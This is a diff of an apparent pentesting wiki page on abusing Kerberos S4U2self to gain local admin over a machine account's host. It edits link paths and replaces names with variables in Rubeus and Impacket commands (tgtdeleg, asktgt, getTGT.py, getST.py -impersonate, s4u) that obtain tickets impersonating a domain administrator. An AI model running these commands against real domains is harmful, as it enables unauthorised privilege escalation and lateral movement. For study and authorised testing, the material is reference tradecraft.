@@ -43,7 +43,7 @@ This step revolves around the `tgtdeleg` feature from [Rubeus](https://github.co
 Rubeus.exe tgtdeleg /nowrap
 ```
 
-The TGT can then be used with [Pass the Ticket](../ptt.md) for the next step, which can be conducted remotely if needed, unlike this initial step.
+The TGT can then be used with [Pass the Ticket](../pass-the/ptt.md) for the next step, which can be conducted remotely if needed, unlike this initial step.
 
 Alternatively, if the machine account credentials are known, a TGT can be requested commonly.
 
@@ -54,7 +54,7 @@ Alternatively, if the machine account credentials are known, a TGT can be reques
 From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) (Python) script can be used for that purpose. However, this step is optional if getST.py is to be used later on for the S4U2self request. In this case, with the appropriate arguments, it will request a TGT automatically
 
 ```bash
-getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
+getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"$MACHINE_ACCOUNT"
 ```
 
 
@@ -63,7 +63,7 @@ getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
 From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose. However, this step is optional if Rubeus is to be used later on for the S4U2self request. In this case, with the appropriate arguments, Rubeus will request a TGT automatically.
 
 ```powershell
-Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
+Rubeus.exe asktgt /nowrap /domain:"domain" /user:"$MACHINE_ACCOUNT" /rc4:"NThash"
 ```
 
 :::
@@ -77,11 +77,11 @@ The TGT can then be used along with S4U2self to obtain a Service Ticket imperson
 
 === UNIX-like
 
-From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s getST.py (Python) script can be used for the purpose. If needed, `.kirbi` files can be converted to `.ccache` (cf. [Pass the Ticket](../ptt.md)).
+From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s getST.py (Python) script can be used for the purpose. If needed, `.kirbi` files can be converted to `.ccache` (cf. [Pass the Ticket](../pass-the/ptt.md)).
 
 ```bash
 export KRB5CCNAME="/path/to/ticket.ccache"
-getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$' 
+getST.py -self -impersonate $TARGET_USER -altservice "cifs/$TARGET_HOST" -k -no-pass -dc-ip $DC_HOST "$DOMAIN"/"$MACHINE_ACCOUNT" 
 ```
 
 
@@ -90,13 +90,13 @@ getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local
 From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
 
 ```powershell
-Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
+Rubeus.exe s4u /self /nowrap /impersonateuser:$TARGET_USER /altservice:"cifs/$TARGET_HOST" /ticket:"base64ticket"
 ```
 
 :::
 
 
-Once a Service Ticket is received, it can be used with [pass-the-ticket](../ptt.md)/[pass-the-cache](../ptc.md) to obtain access to oneself as the "DomainAdmin" (the user can be changed in the request. Attackers should select a domain user which has local admin rights on the machine).
+Once a Service Ticket is received, it can be used with [pass-the-ticket](../pass-the/ptt.md)/[pass-the-cache](../pass-the/ptc.md) to obtain access to oneself as the "DomainAdmin" (the user can be changed in the request. Attackers should select a domain user which has local admin rights on the machine).
 
 > [!TIP]
 > This technique can also be used when receiving TGTs during a [Kerberos Unconstrained Delegation abuse](unconstrained.md) in order to gain local admin privileges over the victims.
